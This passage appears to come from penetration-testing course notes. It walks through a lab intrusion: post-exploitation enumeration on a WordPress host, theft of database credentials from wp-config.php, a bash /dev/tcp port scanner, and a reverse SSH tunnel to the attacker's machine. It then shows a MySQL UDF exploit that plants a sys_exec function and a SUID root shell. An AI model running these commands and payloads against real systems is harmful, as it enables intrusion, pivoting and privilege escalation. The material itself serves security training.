www-data
exit
meterpreter >

 
 Now that we have a shell on the WordPress machine, we will move on to post-exploitationenumeration.
24.2.6 Post-Exploitation Enumeration

24.2.6 Post-Exploitation Enumeration

• First, let’s gather some basic information about the host such as network configuration, hostname,OS version, etc.

meterpreter > shell
Process 6667 created.
Channel 3 created.
ifconfig
ens160 Link encap:Ethernet HWaddr 00:50:56:8a:82:85
 inet addr:10.4.4.10 Bcast:10.4.4.255 Mask:255.255.255.0
 inet6 addr: fe80::250:56ff:fe8a:8285/64 Scope:Link
 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
  RX packets:29154 errors:0 dropped:22 overruns:0 frame:0
 TX packets:176526 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000
 RX bytes:8327519 (8.3 MB) TX bytes:13590061 (13.5 MB)
...
hostname
ajla
cat /etc/issue
Ubuntu 16.04 LTS \n \l
cat /proc/version
Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5
.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
 

• From this basic information gathering, we learn that the host is named “Ajla”, the IP address is 10.4.4.10, and the version of Linux is Ubuntu 16.04.12 on a 4.4.0-21-generic kernel. 

• This information will allow us to start drawing a mental map of the network and might be useful later.

									DMZ

 A demilitarized zone (DMZ) is a perimeter network that protects an organization's internal local-area network (LAN) from untrusted traffic. ... The end goal of a DMZ is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or LAN remains secure.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/39.jpg)
 
 Having collected this basic information, we can move on to more specific enumeration.
 
 Since we know that the target is running WordPress and we found out that the database is on another host,we know that there should be database credentials somewhere on this system. 
 
 A quick Googlesearch reveals that the wp-config.php file is where we can find the database configuration forWordPress.
 
  Looking at this file, we find what might be our next target
  
  meterpreter > shell
Process 9702 created.
Channel 1 created.
pwd
/var/www/html/wp-content/plugins/plugin-shell
cd /var/www/html
ls -alh
...
-rw-r--r-- 1 www-data www-data 2.3K Jan 20 2019 wp-comments-post.php
-rw-r--r-- 1 www-data www-data 2.9K Jan 7 2019 wp-config-sample.php
-rw-r--r-- 1 www-data www-data 2.7K Dec 6 18:07 wp-config.php
drwxrwsr-x 6 www-data www-data 4.0K Dec 9 19:04 wp-content
...
cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'wp' );
/** MySQL database password */
define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );
/** MySQL hostname */
define( 'DB_HOST', '10.5.5.11' );

  
 In the wp_config.php file, we find that the database IP address is set to 10.5.5.11. We alsodiscovered a MariaDB username of “wp” and that the password for this account is“Lv9EVQq86cfi8ioWsqFUQy.
 
 
24.2.7 Creating a Stable Pivot Point

24.2.7 Creating a Stable Pivot Point

 Before continuing, let’s review what we currently have. We have a shell on the WordPress box asthe www-data user and we also have network access to the database via Ajla.
 
 Finally, we just discovered database credentials that we know are valid since they are already in use by theWordPress application.
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24/40.jpg)
 sandbox
 
 Sandboxing is a cybersecurity practice where you run code, observe and analyze and code in a safe, isolated environment on a network that mimics end-user operating environments. 
 
 Sandboxing is designed to prevent threats from getting on the network and is frequently used to inspect untested or untrusted code.
 
 ----------------------------------------------------------------
 
 Since the WordPress machine and the database box are on separate networks, this is a great time to use a tunnel. 
 
 However, our choices are limited due to fact that our reverse shell is running in the context of an unprivileged user account without a valid login shell (www-data).
 
 Since ssh (the client) is a core application that is included in almost every Linux distribution, we can attempt to use it to create a reverse tunnel.
 
 One caveat is that since we do not have root access to create a login for the www-data user, we will need to use the SSH client on the WordPress machine to log in to our Kali server to create the tunnels. In short, we’ll need a reverse tunnel.
 
 A dynamic port forward would not be useful to us since the tunnel would be going the wrong way. 
 
 A local port forward would not be useful either for the same reason. 
 
 A remote port forward would allow us to open up a port in Kali that would point to the MariaDB server. 
 
 However this requires us to know which ports are actually open on the internal target.
 
 First, we will check for Nmap to see if the port scan can be made easier, but we shouldn’t get our hopes up
 
 nmap
/bin/sh: 1: nmap: not found
 
 As expected, Nmap is not on the server, but no need to worry. We can create a quick script to scan the host.
 
 #!/bin/bash
host=10.5.5.11
for port in {1..65535}; do
 timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
 echo "port $port is open"
done
echo "Done"
 
 The contents of the script can be saved in a file named portscan.sh. Our script will iterate each portfrom 1 to 65535. 
 
 For each port, a connection will be made with a timeout of .1 seconds and if the connection succeeds, the script will echo which port is open.
 
 This script is quick and rudimentary; however, it should get us the information that we want. 
 
 To run the script, we will need to dump the contents to a file. A quick way to do this is to use the meterpreter upload command.
 
 meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
[*] uploading : /home/kali/portscan.sh -> /tmp/portscan.sh
[*] Uploaded -1.00 B of 151.00 B (-0.66%): /home/kali/portscan.sh -> /tmp/portscan.sh
[*] uploaded : /home/kali/portscan.sh -> /tmp/portscan.sh
meterpreter > shell
Process 2924 created.
Channel 2 created.
cd /tmp
chmod +x portscan.sh
./portscan.sh
port 22 is open
port 3306 is open
done
 
 The scan will take a while to complete, but when it’s done, we see that port 22 and 3306 are open.
 
 Now we know that we will need to create a tunnel to allow Kali to have access to ports 22 and 3306 on the database server. 
 
 The ssh command to accomplish this will look similar to the following:
 
 ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4 

 
 In Listing 894, we will open up port 1122 on Kali to point to port 22 on the MariaDB host.
 
 Next, we will also open 13306 on Kali to point to 3306 on the MariaDB host.
 
 If we were to run this command in a meterpreter shell, we would quickly run into a hurdle since we don’t have a fully interactive shell.
 
 This is a problem since ssh will prompt us to accept the host key of the Kali machine and enter in the password for our Kali user. 
 
 For security reasons, we want to avoid entering in our Kali password on a host we just compromised.
 
 We can fix the first issue by passing in two optional flags to automatically accept the host key of our Kali machine. 
 
 These are UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no.
 
 The first option prevents ssh from attempting to save the host key by sending the output to /dev/null.
 
 The second option will instruct ssh to not prompt us to accept the host key. 
 
 Both of these options can be set via the -o flag. Our updated command look like thefollowing:
 
 ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o
"StrictHostKeyChecking=no" kali@10.11.0.4
 
 Now we need to prevent ssh from asking us for a password, which we can do by using ssh keys.
 
 We will generate ssh keys on the WordPress host, configure Kali to accept a login from the newly generated key (and only allow port forwarding), and modify the ssh command one more time to match our changes.
 
 mkdir keys
cd keys
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /tmp/keys/id_rsa.
Your public key has been saved in /tmp/keys/id_rsa.pub.
...
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMf
LhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8Z
Io/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T
5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF
9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
 
 This new public key needs to be entered in our Kali host’s authorized_keys file for the kali user, but with some restrictions. 
 
 To avoid potential security issues we can tighten the ssh configuration only permitting access coming from the WordPress IP address (note that this will be the NAT IP since this is what Kali will see and not the IP of the actual WordPress host).
 
 Next, we want to ignore any commands the user supplies.
 
 This can be done with the command option in ssh. 
 
 We also want to prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options. 
 
 Finally, we want to prevent the user from being allocated a tty device with the no-tty option. 
 
 The final ~/.ssh/authorized_keys file on Kali can be found in Listing 897.
 
 from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",
no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA
AABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ
9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7k
Z1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9x
k87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MD
nin www-data@ajla
 
 This entry allows the owner of the private key (the web server), to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.
 
 Next, we need to add a couple more options to our ssh command to ensure that it will work. 
 
 First we need to add the -N flag to specify that we are not running any commands.
 
 We also need the -f option to request ssh to go to the background. Finally, we also need to provide the key file that we are using via -i.
 
 The final SSH command can be found in Listing 898.
 
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
 
 Finally, we need to run the SSH command in the meterpreter shell.
 
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
Could not create directory '/var/www/.ssh'.
Warning: Permanently added '10.11.0.4' (ECDSA) to the list of known hosts
 
 Now let’s verify that the ports are open on our Kali machine:
 
 kali@kali:~$ sudo netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 645/sshd
tcp 0 0 127.0.0.1:13306 0.0.0.0:* LISTEN 91364/sshd: kali
tcp 0 0 127.0.0.1:1122 0.0.0.0:* LISTEN 91364/sshd: kali
tcp6 0 0 :::111 :::* LISTEN 1/systemd
tcp6 0 0 :::22 :::* LISTEN 645/sshd
tcp6 0 0 ::1:13306 :::* LISTEN 91364/sshd: kali
tcp6 0 0 ::1:1122 :::* LISTEN 91364/sshd: kali
... 

 
 At this point, since the ssh command was run in the background, even if our meterpreter shell were to die, we would have remote access to the database server through the remote tunnel.
24.3 Targeting the Database

24.3 Targeting the Database


 Web applications frequently have a database configured on another server as is the case insandbox.local. However, at this point we have network access to the database host and, for themost part, we can treat it as if we are on the same network. As is always the case with tunnels, weshould expect some lag.
24.3.1 Enumeration

24.3.1 Enumeration


 At this point in the enumeration step of the database, we already know a couple of things. Becauseof access to the WordPress server, we know that the host is in a different network than we arecurrently on. We also know that we are running MariaDB version 10.3.20. A quick Google searchshows us this is a fairly new version. This presents a problem as a new version most likely won’thave vulnerabilities that lead to remote code execution.
 
 Let’s connect to the database and start enumerating other aspects of MariaDB.
24.3.1.1 Application/Service Enumeration

24.3.1.1 Application/Service Enumeration

 To connect to MariaDB, we can use Kali’s built in MySQL client along with the credentials we have recovered from the WordPress configuration file.
 
 While MariaDB is a different package than MySQL,it was designed to be backwards compatible.
  
 We will also need to point the MySQL client to the tunnel running on Kali on port 13306.

kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=wp -p
Enter password:
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>

 Now that we are connected, we can look at what privileges we have as the wp user and get a better idea of how this MariaDB instance is configured.

MariaDB [(none)]> SHOW Grants;
+------------------------------------------------------------------------------------+
| Grants for wp@% |
+------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'wp'@'%' IDENTIFIED BY PASSWORD '*61163AE4B131AB0E43F07BE7B' |
| GRANT SELECT, INSERT, UPDATE, DELETE ON `wordpress`.* TO 'wp'@'%' |
+------------------------------------------------------------------------------------+
2 rows in set (0.075 sec)

 We don’t have "*" permissions, but SELECT, INSERT, UPDATE, and DELETE are a good starting point. 
 
 Next, let’s take a look at some variables and see if we can find anything that stands out.
 
 MariaDB [(none)]> show variables;
+------------------------------------------+--------------------------------------+
| Variable_name | Value |
+------------------------------------------+--------------------------------------+
| alter_algorithm | DEFAULT |
| aria_block_size | 8192 |
| aria_checkpoint_interval | 30 |
...
| hostname | zora |
| identity | 0 |
...
| pid_file | /run/mysqld/mariadb.pid |
| plugin_dir | /home/dev/plugin/ |
| plugin_maturity | gamma |
| port | 3306 |
| preload_buffer_size | 32768 |
| profiling | OFF |
...
| tmp_memory_table_size | 16777216 |
| tmp_table_size | 16777216 |
| tmpdir | /var/tmp |
| transaction_alloc_block_size | 8192 |
...
| userstat | OFF |
| version | 10.3.20-MariaDB |
| version_comment | MariaDB Server |
| version_compile_machine | x86_64 |
| version_compile_os | Linux |
| version_malloc_library | system |
...
| wsrep_sst_receive_address | AUTO |
| wsrep_start_position | 00000000-0000-0000-0000-000000000000:|
| wsrep_sync_wait | 0 |
+------------------------------------------+--------------------------------------+
639 rows in set (0.154 sec)
 
 From this one query we learned a few things. 
 
 First, we found that the hostname is “zora”.
 
 From this point on, we will refer to the MariaDB host as Zora. 
 
 Next, we also learned that the tmp directory is in /var/tmp.
 
 We also confirm again that we are running MariaDB version 10.3.20 but we now also learn that the target architecture is x86_64.
 
 The most interesting piece of information we can gatheris that the plugin_dir is set to /home/dev/plugin/. 
 
 This directory is not standard for MariaDB. Let’stake note of that as it might become useful later on.
 
 Now that we have gathered some information, let’s see if we can find any exploits for our targetMariaDB version.
 
 kali@kali:~$ searchsploit mariadb
------------------------------------------------------ -------------------------------
Exploit Title | Path (/usr/share/exploitdb/)
------------------------------------------------------ -------------------------------
MariaDB Client 10.1.26 - Denial of Service (PoC) | exploits/linux/dos/45901.txt
MySQL / MariaDB - Geometry Query Denial of Service | exploits/linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Co | exploits/linux/local/40360.txt
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysq | exploits/linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root | exploits/linux/local/40679.sh
Oracle MySQL / MariaDB - Insecure Salt Generation Sec | exploits/linux/remote/38109.pl
------------------------------------------------------------------ -------------------
Shellcodes: No Result
Papers: No Result

 
 Unfortunately, none of these would work for our version of MariaDB.
 
  Let’s broaden the scope andsee what we get for MySQL.
 
 kali@kali:~$ searchsploit mysql
---------------------------------------------------- ---------------------------------
Exploit Title | Path (/usr/share/exploitdb/)
---------------------------------------------------- ---------------------------------
...
MySQL (Linux) - Database Privilege Escalation | exploits/linux/local/23077.pl
MySQL (Linux) - Heap Overrun (PoC) | exploits/linux/dos/23076.pl
MySQL (Linux) - Stack Buffer Overrun (PoC) | exploits/linux/dos/23075.pl
...
MySQL 3.x/4.x - ALTER TABLE/RENAME Forces Old Permi | exploits/linux/remote/24669.txt
MySQL 4.0.17 (Linux) - User-Defined Function (U | exploits/linux/local/1181.c
MySQL 4.1.18/5.0.20 - Local/Remote Information Leak | exploits/linux/remote/1742.c
MySQL 4.1/5.0 - Authentication Bypass | exploits/multiple/remote/24250.p
l
MySQL 4.1/5.0 - Zero-Length Password Authentication | exploits/multiple/remote/311.pl
MySQL 4.x - CREATE FUNCTION Arbitrary libc Code Exe | exploits/multiple/remote/25209.p
l
MySQL 4.x - CREATE FUNCTION mysql.func Table Arbitr | exploits/multiple/remote/25210.p
hp
MySQL 4.x - CREATE Temporary TABLE Symlink Privileg | exploits/multiple/remote/25211.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) | exploits/linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Com | exploits/windows/remote/3274.txt
MySQL 4.x/5.x - Server Date_Format Denial of Servic | exploits/linux/dos/28234.txt
MySQL 4/5 - SUID Routine Miscalculation Arbitrary D | exploits/linux/remote/28398.txt
MySQL 4/5/6 - UDF for Command Execution | exploits/linux/local/7856.txt
MySQL 5 - Command Line Client HTML Special Characte | exploits/linux/remote/32445.txt
MySQL 5.0.18 - Query Logging Bypass | exploits/linux/remote/27326.txt
...
MySQL Squid Access Report 2.1.4 - HTML Injection | exploits/php/webapps/20055.txt
MySQL Squid Access Report 2.1.4 - SQL Injection / C | exploits/php/webapps/44483.txt
MySQL User-Defined (Linux) (x32/x86_64) - 'sys_ | exploits/linux/local/46249.py
MySQL yaSSL (Linux) - SSL Hello Message Buffer Over | exploits/linux/remote/16849.rb
MySQL yaSSL (Windows) - SSL Hello Message Buffer Ov | exploits/windows/remote/16701.rb
...
-------------------------------------- -----------------------------------------------
Paper Title | Path (/usr/share/exploitdb-papers
-------------------------------------- -----------------------------------------------
...
MySQL Session Hijacking over RFI | docs/english/13708-mysql-session-hijacking-ove
MySQL UDF Exploitation | docs/english/44139-mysql-udf-exploitation.pdf
MySQL: Secure Web Apps - SQL Injectio | papers/english/12945-mysql-secure-web-apps---s
Novel contributions to the field - Ho | docs/english/40143-novel-contributions-to-the-
...
----------------------------------------------------------- --------------------------
 
 When searching for MySQL vulnerabilities, we have to change our approach a bit. 
 
 This time we are not looking for an exact version number that might be vulnerable to an exploit since MariaDB and MySQL use different version numbers. 
 
 Instead, we are trying to see if we can identify a pattern in publicly disclosed exploits that may indicate a type of attack we could use.
 
 We notice that the words “UDF” and “User Defined” show up often. 
 
 Let’s take a look at a more recent UDF exploit found in /usr/share/exploitdb/exploits/linux/local/46249.py.
 
 1 # Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local pr
ivilege escalation exploit
2 # Date: 24/01/2019
3 ...
19 References:
20 https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
21 https://www.exploit-db.com/exploits/1518
22 https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith
Jayathissa (@OsandaMalith)

 
 The exploit begins by referencing other research into UDF exploitation including a paper written on the subject.
 
 Reviewing this paper teaches us that a User Defined Function (UDF) is similar to a custom plugin for MySQL.
 
 It allows database administrators to create custom repeatable functions to accomplish specific objectives.
 
 Conveniently for us, UDFs are written in C or C++ 731 and can run almost anycode we want, including system commands.
 
 Researchers have discovered how to use standard MySQL (and MariaDB) functionality to create these plugins in ways that can be used to exploit systems. 
 
 This specific exploit discusses using UDFs as ways to escalate privileges on a host.
 
 However, we should be able to use the same principle to get an initial shell.
 
  Some modifications will be required but before we start changing anything, let’s take a look at the code.
 
 40 shellcode_x32 = "7f454c4601010100000000000000000...";
41 shellcode_x64 = "7f454c4602010100000000000000000...";
42
43 shellcode = shellcode_x32
44 if (platform.architecture()[0] == '64bit'):
45 shellcode = shellcode_x64
...
71 cmd='mysql -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
72 plugin_str = subprocess.check_output(cmd, shell=True)
73 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
74 res = bool(plugin_dir)
...
91 print "Trying to create a udf library...";
92 os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode
+ ' into dumpfile \'%s\' \G"' % udf_outfile)
93 res = os.path.isfile(udf_outfile)
...
99 print "UDF library crated successfully: %s" % udf_outfile;
100 print "Trying to create sys_exec..."
101 os.system('mysql -u root -p\'' + password + '\' -e "create function sys_exec retu
rns int soname \'%s\'\G"' % udf_filename)
102
103 print "Checking if sys_exec was crated..."
104 cmd='mysql -u root -p\'' + password + '\' -e "select * from mysql.func where name
=\'sys_exec\' \G"';
105 res = subprocess.check_output(cmd, shell=True);
...
110 if res:
111 print "sys_exec was found: %s" % res
112 print "Generating a suid binary in /tmp/sh..."
113 os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp
/bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
114
115 print "Trying to spawn a root shell..."
116 pty.spawn("/tmp/sh");


 
 The first thing we notice is a shellcode variable defined on lines 40-45.
 
 The SQL query at line 71 obtains the plugin directory (remember this is the variable that we found was not standard on Zora).
 
 Next, on line 92, the code dumps the shellcode binary content into a file within the plugin directory.
 
 Line 101 creates a function named sys_exec leveraging the uploaded binary file. 
 
 Finally, the script checks if the function was successfully created on line 104 and if this is the case, the function is executed on line 113.
 
 Reading a bit more about the MySQL CREATE FUNCTION syntax 732 suggeststhat the binary content of the shellcode variable is supposed to be a shared library that implements and exports the function(s) we want to create within the database.
 
 Essentially, this entire script is only running five commands. If we trim down the code to its essentialMySQL commands, we obtain the following:
 
 select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 
 Since we already have an interactive MariaDB shell, we could theoretically run these commands directly in the MariaDB shell against Zora. 
 
 However, we want to make sure we understand what we are about to execute before proceeding.
 
 ------------------------------------------------------------------------
 
 Shell Code
 
 As indicated in Shellcode - Wikipedia, shellcode is a small piece of code generally used as the payload in the exploitation of a software vulnerability. 
 
 It is called "shellcode" because it typically starts a command shell.
 
 After some program is written in, let’s say Assembly, the hex bytes of that program are inserted into another program written in, let’s say C. Upon execution of the C program, the underlying “shellcode” is also executed.
 
 
 In this example are just printing “Hello World” to the screen using the x86–64 Assembly code below.
 
```bash
// code derived from http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/ 
 
section .text 
        global _start 
_start: 
        jmp real_start 
        hello_world:    db      `Hello World\n` 
 
real_start: 
        ; write 
        xor rax, rax                    ; for sake of shellcode 
        mov al, 1                       ; syscall # write 
 
        mov rdi, rax                    ; std out = 1 
        lea rsi, [rel hello_world]      ; buffer w/ relative addressing 
        xor rdx, rdx                    ; clear bits 
        mov dl, 14                      ; # bytes 
        syscall 
 
_exit: 
        xor rax, rax 
        add eax, 60 
        xor rdi, rdi 
        syscall 

If we do an object dump (i.e., objdump) of the assembled Assembly code object file we have the following:

$  objdump -d -M intel 028_helloworld_shellcode_rip_rel 
 
028_helloworld_shellcode_rip_rel:     file format elf64-x86-64 
 
 
Disassembly of section .text: 
 
0000000000400080 <_start>: 
  400080:       eb 0c                   jmp    40008e <real_start> 
 
0000000000400082 <hello_world>: 
  400082:       48 65 6c 6c 6f 20 57 6f 72 6c 64 0a                 Hello World. 
 
000000000040008e <real_start>: 
  40008e:       48 31 c0                xor    rax,rax 
  400091:       b0 01                   mov    al,0x1 
  400093:       48 89 c7                mov    rdi,rax 
  400096:       48 8d 35 e5 ff ff ff    lea    rsi,[rip+0xffffffffffffffe5]        # 400082 <hello_world> 
  40009d:       48 31 d2                xor    rdx,rdx 
  4000a0:       b2 0d                   mov    dl,0xd 
  4000a2:       0f 05                   syscall 
 
00000000004000a4 <_exit>: 
  4000a4:       48 31 c0                xor    rax,rax 
  4000a7:       83 c0 3c                add    eax,0x3c 
  4000aa:       48 31 ff                xor    rdi,rdi 
  4000ad:       0f 05                   syscall 

 ```
 We extract the Assembly opcodes from the above object file then pre-pend each byte with `\ x` to generate the following “string” of “shellcode”.


 ```bash

\xeb\x0c\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x48\x31\xc0\
xb0\x01\x48\x89\xc7\x48\x8d\x35\xe5\xff\xff\xff\x48\x31\xd2\
xb2\x0d\x0f\x05\x48\x31\xc0\x83\xc0\x3c\x48\x31\xff\x0f\x05 
```
 
 We insert the “shellcode” into some C program like the one below.

// http://shell-storm.org/shellcode/files/shellcode-806.php 

```bash
#include <stdio.h> 
#include <string.h> 
 
unsigned char code[] = \ 
"\xeb\x0c\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x48\x31\xc0\
xb0\x01\x48\x89\xc7\x48\x8d\x35\xe5\xff\xff\xff\x48\x31\xd2\xb2\x0d\
x0f\x05\x48\x31\xc0\x83\xc0\x3c\x48\x31\xff\x0f\x05"; 
 
int main() 
{ 
        printf("Shellcode Length: %d\n", (int)strlen(code)); 
        int (*ret)() = (int(*)())code; 
        ret(); 
}
```

Compile the C program then execute accordingly.

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode 


	./shellcode
	Shellcode Length: 47
	Hello World
• Assumes x86–64 NASM Assembly on Linux based OS.

-------------------------------------------------------------------------









24.3.2 Attempting to Exploit the Database

785         24.3.2 Attempting to Exploit the Database

 While the individual commands give us no reason for concern, we have no idea what the shellcode is doing. Instead, we will replace the shellcode with something that we are in control of. Thereferences in the exploit state that raptor_udf.c was used. A quick Google search reveals a relevant
 Exploit Database entry733 and a note at the bottom of the comments mentions a GitHub project734that looks very promising.
 
 Let’s download the code, review it, and compile it.
 
 kali@kali:~$ git clone https://github.com/mysqludf/lib_mysqludf_sys.git
Cloning into 'lib_mysqludf_sys'...
...
kali@kali:~$ cd lib_mysqludf_sys/
kali@kali:~/lib_mysqludf_sys$ 
 
 Opening up the lib_mysqludf_sys.c file shows us a fairly standard UDF library that allows forexecution of system commands through the C/C++ system function.735
 
 ...
my_ulonglong sys_exec(
 UDF_INIT *initid
, UDF_ARGS *args
, char *is_null
, char *error
){
 return system(args->args[0]);
}
...
 
 Moreover, according to the code, the function exported by the shared library after compilation isnamed sys_exec as in the previous exploit. We’ll need to create a MySQL function with the samename in order to execute system commands from the database.
 
 Now that we have reviewed the code, we will compile the shared library.
 
 Looking at the install.sh file, as a prerequisite for compilation we need to install libmysqlclient15-dev. In Kali Linux, this is the default-libmysqlclient-dev package, which can be installed with apt
 
 kali@kali:~/lib_mysqludf_sys$ sudo apt update && sudo apt install default-libmysqlclie
nt-dev
 
 Now that we have the dependencies installed, we need to remove the old object file beforegenerating the new one.
 
 kali@kali:~/lib_mysqludf_sys$ rm lib_mysqludf_sys.so 

 
 Looking at the Makefile, we will need to make some minor adjustments to ensure we can compilethe source file correctly.
 
 LIBDIR=/usr/lib
install:
 gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib
_mysqludf_sys.so
 
 Specifically we need to adjust the include directory path for the gcc command since we have aMariaDB installation on our Kali system and not a MySQL one. The changes to the Makefile areshown in Listing 914.
 
 kali@kali:~/lib_mysqludf_sys$ </span>cat Makefile</span>
LIBDIR=/usr/lib
install:
 gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include
/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so

kali@kali:~/lib_mysqludf_sys$ make
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb
/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
 
 The -W all flag enables all of gcc’s warning messages and -I includes the directory of header files.The list included in the command found in Listing 914 are common locations for header files forMariaDB. The -shared flag tells gcc this is a shared library and to generate a shared object file.Finally, -o tells gcc where to output the file.
 
 Recalling the SQL commands from the UDF exploit, to transfer the shared library to the targetdatabase server, we will need the file as a hexdump
 
 select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 
 To do so we can use the following command:
 
 kali@kali:~/lib_mysqludf_sys$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_s
ys.so.hex
 
 The xxd command is used to make the hexdump and the -p flag outputs a plain hexdump, whichmakes it easier for further manipulation. We use tr to delete the new line character and then dumpthe contents of the output to a file named lib_mysqludf_sys.so.hex.
 
 The contents of the lib_mysqludf_sys.so.hex file is what we will use for shellcode.
 
 We have everything that we need to attempt to exploit Zora. Now we just need to put it together.Before we begin running the malicious SQL commands, we will create a variable in MariaDB for theshellcode. The contents of this variable are obtained from the lib_mysqludf_sys.so.hex file.
 
 MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110
000000000004000000000000000e03b0000000000000000000040003800090040001c001b0001000000040
00000000000...00000000000000000000;
 
 Note the addition of “0x” to the beginning of the shellcode and the lack of single or double quotes.This is necessary for MariaDB to read the text as binary. Next, per the exploit instructions, we willconfirm the location of the plugin directory.
 
 MariaDB [(none)]> select @@plugin_dir;
+-------------------+
| @@plugin_dir |
+-------------------+
| /home/dev/plugin/ |
+-------------------+
1 row in set (0.072 sec)
 
 As expected, the plugin directory is in /home/dev/plugin/. Next, we need to output the shellcode toa file on Zora. The original exploit generates a random filename for this, but we can name itwhatever we want. The command in Listing 919 tells MariaDB to treat the contents of the @shellvariable as binary and to output it to the /home/dev/plugin/udf_sys_exec.so file.
 
 MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so
';
ERROR 1045 (28000): Access denied for user 'wp'@'%' (using password: YES)
MariaDB [(none)]>
 
 Unfortunately, this is where we encounter our first problem. According to the error message above,the wp user does not have permissions to create files.
24.3.2.2 Why We Failed

 24.3.2.2 Why We Failed

